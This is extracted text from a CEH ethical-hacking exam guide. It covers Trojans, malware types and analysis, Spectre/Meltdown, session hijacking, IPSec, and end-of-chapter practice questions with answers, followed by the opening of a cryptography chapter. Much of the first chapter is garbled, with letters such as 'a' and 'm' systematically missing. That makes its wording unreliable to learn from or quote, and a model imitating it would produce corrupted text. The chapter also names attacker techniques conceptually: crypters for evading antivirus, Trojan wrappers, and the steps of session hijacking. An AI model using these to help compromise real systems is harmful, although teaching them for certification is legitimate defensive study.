If putting IPSec into ction in your environent is possible (nd it’s ctully pretty
esy to set up), it is  good choice s  counteresure. Not the only one, but  good
one. I would sy user eduction is key. Oftenties, n uneducted user won’t think twice
bout clicking pst the security certificte wrning or reconnecting fter being suddenly
shut down, nd eduction cn help with one or two instnces here nd there—but don’t
rely on it.

10-ch10.indd 398 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

399

Spectre and Meltdown
Vulnerbilities nd ttcks re so coonplce, ost of the siply coe nd go
with nothing ore thn n ssigned CVE nuber or  brief ention during the
weekly security briefing. But every so often soething coes long tht is so fr
reching, tht cuses so uch hvoc, it not only gets its own ne, but n icon. You
y recll this infortion fro Chpter 5, but it bers repeting: In June 2017,
Google reserchers dvised Intel of  significnt vulnerbility in ost, if not ll, of
its processors. As it turned out, the flw wsn’t only in Intel processors—Apple,
AMD, ARM, Ssung, nd Qulco ll were ffected—but it ws much ore
thn just  coon concern.

Intel (nd other) nufcturers hve relentlessly pursued ens nd ethods
to iprove optiiztion nd perfornce, nd one trek tken ws with soething
clled “specultive processing.” And it’s exctly wht it sounds like—the processor
predicts (guesses) wht the next execution will be in order to speed everything up.
For exple, if n ppliction includes ultiple conditionl stteents, the proces-
sor strts executing nd concluding all possible outputs before the pp sks for the.

So how does this help n ttcker? Well, Google reserchers figured out you cn
force the processor to specultively execute  red before bounds checking is per-
fored, which llows reding of out-of-bound eory loctions nd cn force the
processor to go to plces it wsn’t supposed to. For exple,  bd guy could request
ccess to  eory loction not llowed while siultneously sending requests to
conditionlly red n llowed eory loction. The processor would use specul-
tive execution before executing the request, so while it would note tht the first
request is not llowed or is invlid, specultive execution will hve run it nywy
nd the results fro both will rein in cche eory.

Spectre nd Meltdown re both ttcks tht took dvntge of specultive pro-
cessing (in slightly different wys), nd while you needed soe level of ccess lredy
in plce to tke dvntge of specultive processing, the lrge nuber of ffected,
vulnerble systes de these ttcks extreely concerning nd kept  lot of secu-
rity folks wke for ny  night. Anti-lwre systes did not, nd still don’t, do
 good job of lerting on the ttcks, nd even if you do fll victi to one, there’s
lost no evidence it even occurred. Ptches, updtes, nd fix ctions do exist, but
s we’ve seen with other exploits, tht doesn’t necessrily en systes re protected.

Ne nd n icon? I’d prefer to forget the.

Chapter Review
Malware is generlly defined s softwre designed to hr or secretly ccess  coputer
syste without the owner’s infored consent. Mlwre coponents include

• Malicious code A cond tht delinetes the bsic functionlity of the
lwre (for exple, steling dt)

• Payload A piece of softwre llowing control over the trget fter exploittion,
or perforing the intended ction of the ttcker

10-ch10.indd 399 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

400

• Exploit The code tht tkes dvntge of syste vulnerbilities to ccess dt
or instll lwre

• Injector An ppliction tht injects its own code into running processes to lter
execution (lso used in hiding nd reovl prevention)

• Downloader A Trojn tht downlods other lwre fro n Internet connection
(instlled by n ttcker fter ccess to help with intining ccess)

• Dropper A Trojn type tht instlls other lwre on the coproised
syste covertly

• Obfuscator A licious progr tht couflges its code nd intended purpose

EC-Council defines seven different ethods ttckers use to distribute lwre.
Most of the re firly strightforwrd nd esy to identify. Methods include malvertis-
ing (ebedding lwre stright into those nnoying d networks you see popping up
onscreen everywhere), drive-by downloads (which exploit flws in the browser softwre
itself to instll lwre siply by visiting  pge), nd compromised legitimate sites (led-
ing to infections on visiting systes). Socil engineering distribution ethods include
clickjacking (isleding users into clicking  pge tht looks innocent enough, but holds
lwre redy to go) nd SPAM e-mails (the old tried-nd-true ethod of putting l-
wre s n ttchent to n e-il nd getting the trget to click it). Finlly, Black Hat
Search Engine Optimization (SEO) cn be used to rnk lwre sites higher in serch
engine results, nd spear phishing sites cn be used to iic uthentic businesses, llow-
ing the theft of credentils.

Wrappers re progrs tht llow you to bind n executble of your choice (Trojn)
to n innocent file your trget won’t ind opening. For exple, you ight use  progr
such s EliteWrp to ebed  bckdoor ppliction with  ge file (.exe). Another
wrpper option is using the IExpress Wizrd. IExpress.exe is prt of Windows deploy-
ents since 2000.

Crypters re softwre tools tht use  cobintion of encryption nd code nipul-
tion to render lwre undetectble to AV nd other security-onitoring products (in
Internet lingo, it’s referred to s fud, for “fully undetectble”). Packers use copression to
pck the lwre executble into  sller size. While this does reduce the file size, it lso
serves to ke the lwre hrder to detect for soe nti-lwre engines.

A Trojan is softwre tht ppers to perfor  desirble function for the user prior to
running or instlling it but insted perfors  function, usully without the user’s knowl-
edge, tht stels infortion or otherwise hrs the syste (or dt). To hckers—ethicl
or not— Trojan is  ethod to gin, nd intin, ccess on  trget chine. A com-
mand shell Trojan is intended to provide  bckdoor to the syste tht you connect to
vi cond-line ccess.

10-ch10.indd 400 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

401

The following tble lists iportnt defult port nubers you’ll need to know:

Trojan Name Port Trojan Name Port

Emotet 20/22/80/443 Bionet, MagicHound 6667/12349

Dark FTP 21 GateCrasher 6969

EliteWrap 23 Remote Grab 7000

Mspy 68 ICKiller 7789

Ismdoor, Poison Ivy, 80 Zeus, Shamoon 8080
powerstats

WannaCry, Petya 445 BackOriice 2000 8787/54321

njRAT 1177 Del 10048

DarkComet, Pandora RAT 1604 Git 10100

SpySender 1807 Senna Spy 11000

Xtreme 1863 Progenic Trojan 11223

Deep Throat 2140/3150/6670/6671 Hack 99 Keylogger 12223

Spygate/Punisher RAT 5000 Evil FTP 23456

Blade Runner 5400–02 Back Oriice 1.20/ 31337, 31338
Deep BO

Killer, Houdini 6666 Devil 65000

A virus is  self-replicting progr tht reproduces its code by ttching copies into
other executble codes. In other words, viruses crete copies of theselves in other pro-
grs, then ctivte on soe sort of trigger event (such s  specific user tsk,  prticulr
tie, or n event of soe sort).

Rnsowre is  type of licious softwre designed to deny ccess to  coputer
syste or dt until  rnso is pid, nd typiclly spreds through phishing e-ils or
by unknowing visits to n infected website. The rnsowre “fily” includes exples
such s Dhr, eCh0rix (trgeting Linux devices with QNAP NAS), nd SS
(uses RSA-2048 syetric encryption). Soe others of note include CryptorBit,
CryptoLocker, CryptoDefense, nd Pety ( close cousin of WnnCry tht spred using
the Windows Mngeent Instruenttion cond line).

A worm is  self-replicting lwre coputer progr tht uses  coputer network
to send copies of itself to other systes without hun intervention. Usully it doesn’t
lter files, but it resides in ctive eory nd duplictes itself, eting up resources nd
wreking hvoc long the wy. The ost coon use for  wor in the hcking world
is the cretion of botnets.

Fileless malware is  type of licious softwre tht uses legitite progrs to infect
 coputer. It does not rely on files nd leves no footprint, king it chllenging to
detect nd reove. Frodo, Nuber of the Best, nd The Drk Avenger re ll erly
exples of this type of lwre. Fileless lwre does not require the installation of
ny code on  trget’s syste nd resides in RAM, using ntive, legitite tools tht re

10-ch10.indd 401 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

402

lredy prt of the trget syste to execute ttcks. These processes cn be nything; 
docuent you hve open,  PowerShell you’re working in,  PDF you’re reviewing, or
JvScript running for ny nuber of resons re ll exples. This technique of using
ntive tools to conduct ttcks is lso known s “living off the lnd.”

Malware analysis is the process of reverse engineering  piece of licious softwre to
discover iportnt infortion bout its keup. Dt points you’d be looking t in this
effort include point of origin, how it ctully works, wht ipct it ight hve fro 
growth perspective, nd so forth.

There re two in ethods of lwre nlysis—sttic nd dynic. Static malware
analysis (k static code analysis) is siply going through the executble code to under-
stnd the lwre pckge. No code is ctully executed in this ethod. Insted, the
executble binries re lid out on  virtul tble for your review. There re seven jor
techniques for perforing sttic lwre nlysis:

• File fingerprinting A reltively siple process of coputing  hsh vlue for
the code to identify it nd copre—ginst current or future lwre—for
chnges. Tools for this include HshMyFiles, iktz, nd MD5sus.

• Malware scanning (local and online) In wht y see soewht…weird
(fter ll, you lredy know it’s lwre), point n nti-lwre scnner t the
lwre or uplod it to n online site for nlysis to see if it’s prt of lredy-
known lwre.

• Perform strings search A string is, for lck of  better explntion, n rry of
chrcters tht provides redble text you cn understnd. Strings cn be notes in
the code fro the progrer to denote wht  prticulr section is doing, error
essges coded in, or specific ites progred in to counicte fro the
ppliction to the user. String serches cn be perfored with tools like BinText,
FLOSS, nd Strings.

• Identify packing/obfuscation You cn use tools like PEiD to provide detils
bout the executble, including signtures for coon pckers, crypters,
nd copilers.

• Identify portable executables (PE) information PE is the executble file
fort for Windows operting systes, encpsulting infortion necessry
for Windows OS loders to nge wrpped executble code. Anlysis of the
etdt of these files provides infortion such s dte of copiltion, librires,
icons, functions (iported nd exported), nd strings. PE Explorer, PEView, nd
Resource Hcker re ll tools tht cn help with this.

• Identify file dependencies For ny file to work, it hs to interct—
soewhere—with internl syste files. You cn use tools like Dependency
Wlker, Snyk, nd Dependency-check to find these iport nd export functions
(in the kernel32.dll file), long with DLLs nd librry functions.

• Malware disassembly In this finl stge, you literlly rip the code prt,
disssebling it to exine the ssebly code instructions. IDA is  disssebler/
debugger ppliction tht cn help with this, providing infortion on function
trcing, red/write executions, nd instruction trcing.

10-ch10.indd 402 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

403

In dynamic malware analysis, you literlly put lwre on n isolted syste (snd-
box) nd ctully execute it, llowing you to wtch its behvior s it executes nd runs.
Once you hve the lwre on n isolted test bed—please, please make sure it’s isolated
first—reeber to tke  snpshot of the syste’s bseline before beginning. Next, s
you strt to run the lwre, py very close ttention to port nd process onitoring.
Other res you’d wnt to py ttention to s the lwre rvges your isolted sndbox
include network trffic, drivers, files nd folders, nd API clls. Network trffic reviews
include identifying wht nd where the lwre is reching out (bck) to nd wht
DNS chnges re being ffected. You cn onitor network trffic through sniffers nd
pcket cptures, nd relly dive down further by using tools like Cps nd SolrWinds
NetFlow Trffic Anlyzer. Keep n eye on DNS efforts through tools like DNSstuff nd
DNSQuerySniffer.

You cn exine ctul instlltion steps the lwre uses through tools like Mireku-
soft Instll Monitor nd SysAnlyzer. How bout file nd folder onitoring? Check out
Tripwire, Versisys, nd PA File Sight. API clls llowing the lwre to ccess syste
files? Tke  look t API Monitor or APIetrics.

Eotet nd SS re lwre exples clled out explicitly in officil coursewre.
Eotet is  coon bnking Trojn (usully spred vi  URL in n e-il) tht cretes
 file clled cultureresource.exe, encrypts everything it tries to do, nd counictes
with  cond-nd-control externl server. SS is  well-known rnsowre tht
uses brute-force tctics ginst RDP.

In session hijacking, n ttcker wits for  session to begin nd, fter ll the pesky
uthentiction gets done, jups in to stel the session for hiself. The server isn’t even
wre of wht hppened, nd the client siply connects gin in  different session. The
following ore copletely describes the session hijcking steps (per EC-Council):

1. Sniff the trffic between the client nd the server.
2. Monitor the trffic nd predict the sequence nubering.
3. Desynchronize the session with the client.
4. Predict the session token nd tke over the session.
5. Inject pckets to the trget server.

You’ll need to reeber tht the sequence nubers increent on cknowledgent.
Additionlly, you’ll lost certinly get sked  scenrio version of sequence nuber-
ing. You’ll need to know, given n cknowledgent nuber nd  window size, wht
sequence nuber would be cceptble to the syste. For exple, n cknowledgent
of 105 with  window size of 200 ens you could expect sequence nubering fro
105 through 305.

IPSec is used to secure IP couniction by providing encryption nd uthentic-
tion services to ech pcket, nd it hs severl rchitecturl coponents you’ll need to
know. First, IPSec works in two odes. In transport mode, the pylod nd ESP triler
re encrypted; however, the IP heder of the originl pcket is not. Trnsport ode cn
be used in NAT becuse the originl pcket is still routed in exctly the se nner
s it would hve been without IPSec. Tunnel mode, however, encrypts the whole thing,

10-ch10.indd 403 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

404

encpsulting the entire originl pcket in  new IPSec shell. This kes it incopt-
ible with NAT. The rest of IPSec rchitecture includes the following protocols:

• Authentication Header AH is  protocol within IPSec tht gurntees the
integrity nd uthentiction of the IP pcket sender.

• Encapsulating Security Payload ESP is  protocol tht lso provides origin
uthenticity nd integrity, but it cn tke cre of confidentility (through
encryption) too. ESP does not provide integrity nd uthentiction for the entire
IP pcket in trnsport ode, but in tunnel ode it provides protection to the
entire IP pcket.

• Internet Key Exchange IKE is  protocol tht produces the keys for the
encryption process.

• Oakley Okley is  protocol tht uses Diffie-Helln to crete ster nd
session keys.

• Internet Security Association Key Management Protocol A protocol tht
fcilittes encrypted couniction between two endpoints.

Questions
1. Which of the following doesn’t define  ethod of trnsitting dt tht violtes

 security policy?
A. Bckdoor chnnel
B. Session hijcking
C. Covert chnnel
D. Overt chnnel

2. Which of the following propgtes without hun interction?
A. Trojn
B. Wor
C. Virus
D. MITM

3. Which of the following don’t use ICMP in the ttck? (Choose two.)
A. SYN flood
B. Ping of deth
C. Surf
D. Peer to peer

10-ch10.indd 404 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

405

4. Which of the following is not  recoended step in recovering fro 
lwre infection?
A. Delete syste restore points.
B. Bck up the hrd drive.
C. Reove the syste fro the network.
D. Reinstll fro originl edi.

5. Which of the following re recoendtions to protect ginst session hijcking?
(Choose two.)
A. Use only nonroutble protocols.
B. Use unpredictble sequence nubers.
C. Use  file verifiction ppliction, such s Tripwire.
D. Use  good pssword policy.
E. Ipleent IPSec throughout the environent.

6. Which of the following ttcks n lredy-uthenticted connection?
A. Surf
B. Denil of service
C. Session hijcking
D. Phishing

7. How does Tripwire (nd progrs like it) help ginst Trojn ttcks?
A. Tripwire is n AV ppliction tht qurntines nd reoves lwre

ieditely.
B. Tripwire is n AV ppliction tht qurntines nd reoves lwre fter 

scn.
C. Tripwire is  file-integrity-checking ppliction tht rejects lwre pckets

intended for the kernel.
D. Tripwire is  file-integrity-checking ppliction tht notifies you when  syste

file hs been ltered, potentilly indicting lwre.
8. Which of the following DoS ctegories consues ll vilble bndwidth for the

syste or service?
A. Frgenttion ttcks
B. Voluetric ttcks
C. Appliction ttcks
D. TCP stte-exhustion ttcks

10-ch10.indd 405 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

CEH Certified Ethical Hacker All-in-One Exam Guide

406

9. During  TCP dt exchnge, the client hs offered  sequence nuber of 100,
nd the server hs offered 500. During cknowledgents, the pcket shows
101 nd 501, respectively, s the greed-upon sequence nubers. With  window
size of 5, which sequence nubers would the server willingly ccept s prt of
this session?
A. 102 through 104
B. 102 through 501
C. 102 through 502
D. Anything bove 501

10. Which of the following does not require the instlltion of ny code on  trget’s
syste nd resides in RAM?
A. Fileless lwre
B. RAMwre
C. Trojn
D. Rnsowre

11. Which of the following best describes  DRDoS?
A. Multiple interediry chines send the ttck t the behest of the ttcker.
B. The ttcker sends thousnds upon thousnds of SYN pckets to the chine

with  flse source IP ddress.
C. The ttcker sends thousnds of SYN pckets to the trget but never responds

to ny of the return SYN/ACK pckets.
D. The ttck involves sending  lrge nuber of grbled IP frgents with

overlpping, oversized pylods to the trget chine.
12. Which of the following best describes  terdrop ttck?

A. The ttcker sends  pcket with the se source nd destintion ddress.
B. The ttcker sends severl overlpping, extreely lrge IP frgents.
C. The ttcker sends UDP Echo pckets with  spoofed ddress.
D. The ttcker uses ICMP brodcst to DoS trgets.

Answers
1. D. Overt chnnels re legitite, nd used legititely. Everything else listed

would be in violtion of  security policy.
2. B. Much like Skynet fro the Terintor ovies, wors do not need us

to propgte.
3. A, D. A SYN flood doesn’t use ICMP t ll, nor does  peer-to-peer ttck.

10-ch10.indd 406 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 10

Chapter 10: Trojans and Other Attacks

407

4. B. Bcking up  hrd drive tht’s lredy infected kes s uch sense s putting
ketchup on  doughnut. The licious files re on the drive, so bcking it up
does nothing but ensure you’ll reinfect soething lter on.

5. B, E. Unpredictble sequence nubers ke session hijcking nerly ipossible,
nd ipleenting IPSec—which provides encryption nd uthentiction
services—is lso probbly  good ide.

6. C. Session hijcking tkes dvntge of connections lredy in plce nd lredy
uthenticted.

7. D. Tripwire is one of the better-known file integrity verifiers, nd it cn help
prevent Trojns by notifying you ieditely when n iportnt file is ltered.

8. B. Voluetric ttcks consue ll vilble bndwidth for the syste or service.
9. A. Strting with the cknowledged sequence nuber of 101, the server will

ccept pckets between 102 nd 104 before sending n cknowledgent.
10. A. Fileless lwre tkes dvntge of running processes lredy on your syste

to wrek hvoc.
11. A. The distributed reflection denil-of-service (DRDoS) ttck is, for ll intents

nd purposes,  botnet. Secondry systes crry out the ttcks so the ttcker
reins hidden.

12. B. In  terdrop ttck, the ressebly of frgents tkes down the trget.

10-ch10.indd 407 14/09/21 4:03 PM



Passport_2019 / Mike Meyers’ CompTIA Security+™ Certifcation Passport / Dunkerley / 795-3 / FM / Blind olio: vi

This page intentionally left blank

00-FM.indd 6 09/11/20 6:45 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CHAPTER

Cryptography 101 11
In this chapter you will

• Describe cryptography and encryption techniques
• Deine cryptographic algorithms
• Describe public and private key generation concepts
• Describe digital signature components and usage
• Describe cryptanalysis and code-breaking tools and methodologies
• List cryptography attacks

Around 180 BC, the Greek philosopher and historian Polybius was busy putting together
some revolutionary rethinking of government. He postulated on such ideas as the separa-
tion of powers and a government meant to serve the people instead of rule over them. If
this sounds familiar, it should: his work became part of the foundation for later philoso-
phers and writers (including Montesquieu), and the U.S. Constitution.

Considering, though, the times he lived in, not to mention his family circumstances
and upbringing, it’s fairly easy to see where Polybius might have wanted a little secrecy in
his writing. His father was a Greek politician and an open opponent of Roman control
of Macedonia. This eventually led to his arrest and imprisonment, and Polybius was
deported to Rome. There, Polybius was employed as a tutor. He eventually met and
befriended a Roman military leader and began chronicling the events he witnessed (these
works would become known as The Histories, detailing the Roman rise to power from
264 to 146 BC).

During all this historical writing, though, Polybius couldn’t shake his father’s voice
and continued writing about the separation of government powers and the abuses of dic-
tatorial rule. In an effort to keep this part of his writing secret, he came up with what has
become known as the Polybius square. The idea was simple. First, create a checkerboard
with numbers running across the top and along the left side. Next, populate the interior

409

11-ch11.indd 409 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

410

with the letters of the alphabet. Then, when writing, a letter would become its coordi-
nates on the grid; for example, A might be written as 11, while B would be 12.

1 2 3 4 5 6

1 A B C D E F

2 G H I J K L

3 M N O P Q R

4 S T U V W X

5 Y Z 0 1 2 3

6 4 5 6 7 8 9

Was it an unbeatable cipher system that kept everything safe? Was it even the first
recorded effort at encrypting messages so that no one but the recipient could read them?
No, it was neither. It did, however, mark one of the historic turning points in cryptog-
raphy and led to worlds of other inventions and uses (including steganography). From
cavemen working out a succession of knocks and beats to the secure e-mail I just sent my
boss a few minutes ago, we’ve been trying to keep certain communications secret since
the dawn of time. And, since the dawn of time, we’ve been trying to figure out what the
other guy was saying—trying to “crack his code.” The implementation and study of this
particular little fascination of the human psyche—securing communication between two
or more parties—is known as cryptography. For you budding ethical hackers reading this
book, the skill you’re looking to master, though, is cryptanalysis, which is the study and
methods used to crack encrypted communications.

Cryptography and Encryption Overview
I debated long and hard over just how much history to put into this discussion on
cryptography but finally came to the conclusion I shouldn’t put in any, even though
it’s really cool and interesting (c’mon, admit it, the opening to this chapter entertained
and enthralled you, didn’t it?). I mean, you’re probably not concerned with how the
ancient Romans tried to secure their communications or who the first purveyors of
steganography—hiding messages inside an image—were (toss-up between the Greeks and
the Egyptians, depending on your source). What you are, and should be, concerned with
is what cryptography actually is and why you should know anything about it. Excellent
thoughts. Let’s discuss.

Terminology
Cryptography is the science or study of protecting information, whether in transit or at
rest, by using techniques to render the information unusable to anyone who does not
possess the means to decrypt it. The overall process is fairly simple: take plain-text data
(something you can read), apply a cryptographic method, and turn it into cipher text
(something you can’t read)—so long as there is some provision to allow you to bring the
cipher text back to plain text. What is not so simple is the actual process of encrypting
and decrypting.

11-ch11.indd 410 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

411

Cryptanalysis is the study and methods used to crack the communications we just
talked about, and there are three main methods to discuss. First, you can attack encrypted
communication in a linear fashion—that is, take blocks of known text and compare
them to blocks of the encrypted text, line by line, from front to back. Known as linear
cryptanalysis, this method works best on block ciphers (something we’re going to cover a
little later on) and was developed by Mitsuru Matsui in 1993. As encryption techniques
evolved, so did cryptanalysis, and differential cryptanalysis came about. This method is
applicable to symmetric key algorithms and basically compares differences in inputs to
how each one affects the outcome. Integral cryptanalysis uses the same input versus output
comparison but also runs multiple computations of the same block size input.

Now, will knowing the approach used for a specific cryptanalysis effort make you a
better pen tester? Who knows—maybe some of you reading this will go into that line
of work and this will be insanely helpful as a starter. For the rest of us, it’s good info to
know, but not really a life-changing experience. So sit back and relax as the rest of this
chapter is dedicated to exploring some of the mathematical procedures, known as encryp-
tion algorithms or ciphers, used to encrypt and decrypt data.

NOTE Don’t be conused by the term plain text. Yes, it can be used
to deine text data in ASCII ormat. However, within the conines o
cryptography, plain text reers to anything that is not encrypted—whether
text or not.

It’s also important to understand what functions cryptography can provide. In Chap-
ter 1, we discussed the hallowed trinity of security—confidentiality, integrity, and avail-
ability. When it comes to cryptography, confidentiality is the one that most often is
brought up. Encrypting data helps to provide confidentiality of the data because only
those with the “key” can see it. However, some other encryption algorithms and tech-
niques also provide for integrity (hashes that ensure the message hasn’t been changed) as
does nonrepudiation, which is the means by which a recipient can ensure the identity of
the sender and neither party can deny having sent or received the message. Our discus-
sion of public key infrastructure (PKI) later in the chapter will definitely touch on this.
This chapter is all about defining what cryptography methods are available so that you
know what you’re up against as an ethical hacker.

Encryption Algorithms and Techniques
Cryptographic systems can be as simple as substituting one character for another (the
old Caesar Cipher simply replaced characters in a string: B for A, C for B, and so on) or
as complex as applying mathematical formulas to change the content entirely. Modern-
day systems use encryption algorithms and separate keys to accomplish the task. In its
simplest definition, an algorithm is a step-by-step method of solving a problem. The
problem, when it comes to the application of cryptography, is how to render something
unreadable and then provide a means to recover it. Encryption algorithms were created
for just such a purpose.

11-ch11.indd 411 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

412

EXAM TIP Encryption o bits takes, generally, one o two dierent orms:
substitution or transposition. Substitution is exactly what it sounds like—
bits are simply replaced by other bits. Transposition doesn’t replace bits at
all; it changes their order altogether.

Encryption algorithms—mathematical formulas used to encrypt and decrypt data—are
highly specialized and, sometimes, very complex. These algorithms are also known as
ciphers. The good news for you as a CEH candidate is you don’t need to learn every last
detail of how these algorithms actually accomplish their task. You do need to learn, how-
ever, how they are classified and some basic information about each one. For example, a
good place to start might be the understanding that modern-day systems use encryption
algorithms that are dependent on a separate key, meaning that without the key, the algo-
rithm itself should be useless in trying to decode the data. There are two main methods
by which these keys can be used and shared: symmetric and asymmetric. Before we get
to those methods, though, let’s discuss how ciphers work.

All encryption algorithms on the planet have basically two methods they can use to
encrypt data, and if you think about how they work, the names make perfect sense. In
the first method, bits of data are encrypted as a continuous stream. In other words, read-
able bits in their regular pattern are fed into the cipher and are encrypted one at a time,
usually by an XOR operation (exclusive-or). Known as stream ciphers, these work at a
very high rate of speed.

In the other method, data bits are split up into blocks and fed into the cipher. Each
block of data (commonly 64 bits at a time) is then encrypted with the key and algorithm.
These ciphers, known as block ciphers, use methods such as substitution and transposition
in their algorithms and are considered simpler, and slower, than stream ciphers.

NOTE Want to learn a little more about all this cryptography stu? Why not
give CrypTool (https://www.cryptool.org/en) a shot? It’s ree, it’s online, and
it has multiple oshoots to satisy almost all your cryptographic curiosity.

In addition to the types of ciphers, another topic you need to commit to memory
applies to the nuts and bolts. XOR operations are at the core of a lot of computing. An
XOR operation requires two inputs. In the case of encryption algorithms, this would
be the data bits and the key bits. Each bit is fed into the operation—one from the data,
the next from the key—and then XOR makes a determination. If the bits match, the
output is a 0; if they don’t, it’s a 1 (see the following XOR table).

First Input Second Input Output

0 0 0

0 1 1

1 0 1

1 1 0

For example, suppose you had a stream of data bits that read 10110011 and a key that
started 11011010. If you did an XOR on these bits, you’d get 01101001. The first two

11-ch11.indd 412 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

413

bits (1 from data and 1 from the key) are the same, so the output is a 0. The second two
bits (0 from data and 1 from the key) are different, outputting a 1. Continue that process
through, and you’ll see the result.

In regard to cryptography and pure XOR ciphers, keep in mind that key length is of
utmost importance. If the key chosen is actually smaller than the data, the cipher will be
vulnerable to frequency attacks. In other words, because the key will be used repeatedly
in the process, its very frequency will make guessing it (or using some other cryptanalytic
technique) easier.

EXAM TIP There is a lot to remember in this chapter, so this tip may be
helpul as a quick memorization eort. The way modern ciphers work can
be discussed in two main categories: ciphers based on the type o key used
and ciphers based on the type o input data. Key types include symmetric
(a single key does everything) and asymmetric (a private key is used to
encrypt and a public key is used to decrypt), while the type o input data
reers to block (ixed-sized blocks encrypted) versus stream (continuous eed
o data is encrypted as it arrives).

Symmetric Encryption
Symmetric encryption (also known as single key or shared key encryption) simply means one
key is used both to encrypt and to decrypt the data. So long as both the sender and the
receiver know/have the secret key, communication can be encrypted between the two. In
keeping with the old principle KISS (keep it simple, stupid), the simplicity of symmetric
encryption is its greatest asset. As you can imagine, this makes things easy and fast. Bulk
encryption needs? Symmetric algorithms and techniques are your best bet.

But symmetric key encryption isn’t all roses and chocolate; there are some significant
drawbacks and weaknesses. For starters, key distribution and management in this type
of system are difficult. How do you safely share the secret key? If you send it over the
network, someone can steal it. Additionally, because everyone has to have a specific key
from each partner they want to communicate with, the sheer number of keys needed
presents a problem.

Suppose you had two people you wanted to safely communicate with. This creates
three different lines of communication that must be secured; therefore, you’d need three
keys. If you add another person to the mix, there are now six lines of communication,
requiring six different keys; see Figure 11-1. As you can imagine, this number jumps up
exponentially the larger your network becomes. The formula for calculating how many
key pairs you will need is

N (N – 1) / 2

where N is the number of nodes in the network.
Here are some examples of symmetric algorithms:

• DES (Data Encryption Standard) A block cipher that uses a 56-bit key (with
8 bits reserved for parity). Because of the small key size, this encryption standard
became quickly outdated and is not considered a very secure encryption algorithm.

11-ch11.indd 413 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

CEH Certified Ethical Hacker All-in-One Exam Guide

414

Three communications channels necessary Six communications channels necessary for
for communication between all nodes communication between all nodes

Figure 11-1 Key distribution in symmetric encryption systems

• 3DES A block cipher that uses a 168-bit key. 3DES (called triple DES) can use
up to three keys in a multiple-encryption method. It’s much more effective than
DES but is much slower.

• AES (Advanced Encryption Standard) A block cipher that uses a key length
of 128, 192, or 256 bits, and effectively replaces DES. It’s much faster than DES
or 3DES.

• IDEA (International Data Encryption Algorithm) A block cipher that uses
a 128-bit key and was also designed to replace DES. Originally used in Pretty
Good Privacy (PGP) 2.0, IDEA was patented and used mainly in Europe.

• Twofish A block cipher that uses a key size up to 256 bits.

• Blowfish A fast block cipher, largely replaced by AES, using a 64-bit block size
and a key from 32 to 448 bits. Blowfish is considered public domain.

• RC (Rivest Cipher) Encompasses several versions, from RC2 through RC6.
A block cipher that uses a variable key length up to 2040 bits. RC6, the latest
version, uses 128-bit blocks and 4-bit working registers, whereas RC5 uses
variable block sizes (32, 64, or 128) and 2-bit working registers.

• Serpent A block cipher that uses a key length 128, 192, or 256 bits. It makes
use of 32 rounds of computational operations (substitutions and permutations).

• TEA (Tiny Encryption Algorithm) Makes use of a Feistel cipher (a block
cipher build that runs a round function a fixed number of times) and 64 rounds
of operations, with 128 or 64 bit keys.

• GOST Also known as Magma, this is a 32-round Feistel cipher using
64 256-bit keys.

• Camellia An 18- or 24-round cipher (128- or 256-bit length, respectively)
used as part of TLS.

11-ch11.indd 414 14/09/21 4:06 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 11

Chapter 11: Cryptography 101

415

And there you have it—symmetric encryption is considered fast and strong but poses
some significant weaknesses. It’s a great choice for bulk encryption because of its speed,
but key distribution is an issue because the delivery of the key for the secured channel
must be done offline. Additionally, scalability is a concern because the larger the network
gets, the number of keys that must be generated increases greatly.

Lastly, symmetric encryption does a great job with confidentiality but does noth-
ing to provide for another important security measure—nonrepudiation. As stated
earlier, nonrepudiation is the method by which we can prove the sender’s identity,
as well as prevent either party from denying they took part in the data exchange.
These weaknesses led to the creation and implementation of the second means of
encryption—asymmetric.

Asymmetric Encryption
Asymmetric encryption came about mainly because of the problem inherent in using a
single key to encrypt and decrypt messages—just how do you share the key efficiently
and easily without compromising the security? The answer was, of course, to simply
use two keys. In this key-pair system, both are generated together, with one key used to
encrypt a message and the other to decrypt it. The encryption key, also known as the
public key, could be sent anywhere, to anyone. The decryption key, known as the private
key, is kept secured on the system.

For example, suppose two people want to secure communications across the Internet
between themselves. Using symmetric encryption, they’d need to develop some offline
method to exchange the single key used for all encryption/decryption (and agree on
changing it fairly often). With asymmetric encryption, they both generate a key pair.
